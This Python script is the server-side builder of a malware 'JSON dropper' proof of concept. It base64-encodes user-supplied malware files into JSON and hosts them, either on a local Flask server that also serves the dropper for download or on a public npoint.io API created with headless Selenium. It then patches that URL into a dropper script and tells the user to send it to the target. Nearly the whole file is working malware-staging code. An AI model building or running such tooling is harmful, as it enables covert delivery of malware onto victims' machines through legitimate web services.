#############################################################################
# Offline Py-JSON-Dropper - create_json - Python Script
# Description: A POC for JSON dropper(drop by fetching API JSON). It will ask for malware path and create a new json file with encode malware bodies.
# Author: Dor Dahan
# License: MIT (See details in the LICENSE file or at the end of this script)
##############################################################################

import base64, json, psutil
import socket
from vars import *
from flask import Flask, jsonify, send_file
from waitress import serve

class Creator:
    def __init__(self) -> object:
        """
        Initialize the basic variables
        """
        self.final_json = {}
        self.names = []

    def json_format(self, binary_file:str) -> None:
        """
        Will take the malware path, and get the binary text from the file.
        It will encode the text to dict and store it for later use.
        :param binary_file: The malware path.
        :return: None
        """
        with open(binary_file, "rb") as file:
            text = file.read()
        if "/" in binary_file:
            binary_file = binary_file.split("/")[-1]
        elif "\\" in binary_file:
            binary_file = binary_file.split("\\")[-1]
        self.names.append(binary_file)
        encoded = base64.b64encode(text)
        encoded = encoded.decode('utf-8')
        self.final_json[binary_file.split(".")[0]] = {"body": encoded, "fullName": binary_file}

    def save_json(self, file_name:str) -> None:
        """
        Save the dict to a json format file
        :param file_name: The json file name
        :return: None
        """
        with open(file_name, "w") as file:
            json.dump(self.final_json, file, indent=4)

def website(file_name):
    """
    Creating an API website in local network
    :param file_name: The json file name.
    :return: None
    """
    app = Flask(__name__)
    app.config['SECRET_KEY'] = '8BYkEfBA6O6donzWlSihBXox7C0sKR6b'
    @app.route("/")
    def api():
        with open(file_name) as file:
            json_data = json.load(file)
            return jsonify(json_data)

    @app.route('/download')
    def download_file():
        return send_file("dropper_final.py", as_attachment=True)
    serve(app, host="0.0.0.0", port=8080)

def get_main_interface_ip():
    """
    Will return the IP of the interface that are not local host
    :return: IP or None
    """
    interfaces = psutil.net_if_addrs()
    for interface, addrs in interfaces.items():
        for addr in addrs:
            if addr.family == socket.AF_INET and not addr.address.startswith('127.'):
                return addr.address
    return None


def process():
    global json_file
    """
    The user-interface and main function, it will get the malware names and
    get them to base64 encode of the malware body, for final insert the dict to json file
    :return: The json file name, local/remote, json object.
    """
    json_file = Creator()
    end = False
    files = []
    # Get the malware names
    user_file = input(f"{color['BOLD']}{color['BLUE']}Enter the malware file path: {color['RESET']}")
    if user_file == "":
        print(f"{color['BOLD']}{color['RED']}You didn't enter a file...{color['RESET']}")
        exit(1)
    files.append(user_file)
    check = input(f"{color['BOLD']}{color['BLUE']}Add more payloads?[yes/no]: {color['RESET']}")
    if check.lower().startswith("y"):
        while not end:
            user_file = input(F"{color['BOLD']}{color['BLUE']}Enter the malware file path[for exit press no]: {color['RESET']}")
            if user_file.lower() == "no":
                end = True
            else:
                files.append(user_file)
    # Transfer the malware body to encode and insert them to json format(dict)
    for file in files:
        json_file.json_format(file)
    # The type of API
    choose = input(f"{color['BOLD']}{color['BLUE']}Choose type of server[local/remote]: {color['RESET']}")
    if choose == "":
        choose="remote"
    # Choose a name for the json file
    if len(json_file.names) == 1:
        name = f"{json_file.names[0].split('.')[0]}.json"
    else:
        name = "payloads_file.json"
    json_file.save_json(name)
    print(f"{color['BOLD']}{color['GREEN']}Done! You can see the json format in {name}{color['RESET']}")
    # Getting the IP for the web server URL
    return name, choose, json_file

def editing_file(url):
    with open("dropper.py", "r") as file:
        text = file.readlines()
    text = [f"URL = '{url}'" if line.startswith('URL = ""') else line for line in text]
    with open("dropper_final.py", "w") as file1:
        file1.write("".join(text))
    print(f"{color['BOLD']}{color['GREEN']}The dropper_final.py is ready to send the targert...{color['RESET']}")

def local_api():
    """
    Creating the UI of local network urls for the user
    """
    main_interface_ip = get_main_interface_ip()
    if main_interface_ip:
        url = f"http://{main_interface_ip}:8080/"
    else:
        url = f"http://127.0.0.1:8080/"
        print(
            f"{color['BOLD']}{color['RED']}Did not find the ip the run this local or change the URL parameters in the dropper script.{color['RESET']}")
    # Editing the dropper file with the new URL
    editing_file(url)
    print(f"{color['BOLD']}{color['CYAN']}The dropper_final.py is ready to use!\nSend the dropper_final.py too the target...{color['RESET']}")
    print(f"{color['BOLD']}{color['CYAN']}Your API are on the website server in the address of: {url}{color['RESET']}")
    print(f"{color['BOLD']}{color['CYAN']}You can download the dropper_final.py from: {url}download{color['RESET']}")


def API_interface_link(session: object):
    """
    Get the link of the API interface.
    :param session: The driver of selenium
    :return: None
    """
    from selenium.webdriver.common.by import By
    import time
    session.get("https://www.npoint.io/")
    button = session.find_element(By.CSS_SELECTOR, ".index-editor-buttons .button")
    button.click()
    time.sleep(2)
    link = session.current_url
    url = link.split("/")[-1]
    url = f"https://api.npoint.io/{url}"
    editing_file(url)
    session.quit()
    print(f"{color['BOLD']}{color['CYAN']}This is your API link for online API interface: {link}{color['RESET']}")
    print(f"{color['BOLD']}{color['CYAN']}Take the API link and copy this JSON to the API interface...{color['RESET']}")
    print(f"{color['BOLD']}{color['CYAN']}JSON text to copy:{color['RESET']}")
    print(json_file.final_json)


def remote_API():
    """
    Will create via selenium the new api url to work with.
    :return: None
    """
    import warnings
    from selenium import webdriver
    from selenium.webdriver.firefox.service import Service
    from selenium.common.exceptions import WebDriverException

    print(f"{color['BOLD']}{color['CYAN']}Wait for API link....{color['RESET']}")
    if WIN:

        options = webdriver.FirefoxOptions()
        options.headless = True
        options.accept_insecure_certs = True
        # Getting the information from the web browser in Windows.
        geckodriver_path = "drivers/geckodriver.exe"
        service = Service(geckodriver_path)
        driver = webdriver.Firefox(service=service, options=options)
        API_interface_link(driver)
        service.stop()
    elif LIN:
        try:
            # Getting the information from the web browser in Linux.
            chrome_driver_path = "drivers/chromedriver"
            chrome_binary_path = "/usr/bin/google-chrome"
            options = webdriver.ChromeOptions()
            options.add_argument('--headless')
            options.binary_location = chrome_binary_path
            # Ignore the DeprecationWarning temporarily
            with warnings.catch_warnings():
                warnings.simplefilter("ignore", category=DeprecationWarning)

                driver = webdriver.Chrome(options=options)
                API_interface_link(driver)
        except WebDriverException as e:
            print(f"{color['BOLD']}{color['RED']}{e}{color['RESET']}")

def main():
    if WIN:
        if not win_admin():
            name, choose, json_file = process()
            if choose.lower() == "local":
                local_api()
                website(f"{name}")
            elif choose.lower() == "remote":
                remote_API()
        else:
            print(f"{color['BOLD']}{color['RED']}This script need to be run as regular user!!{color['RESET']}")
    elif LIN:
        if not lin_user():
            name, choose, json_file = process()
            if choose.lower() == "local":
                local_api()
                website(f"{name}")
            elif choose.lower() == "remote":
                remote_API()
if __name__ == '__main__':
    main()


# License Information
# This script is open-source and released under the MIT License.
# MIT License
# Copyright (c) 2023 Dor Dahan
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# For more details, see the LICENSE file in the root directory of this repository
# Or visit https://github.com/D0rDa4aN919/Py-JSON-Dropper.

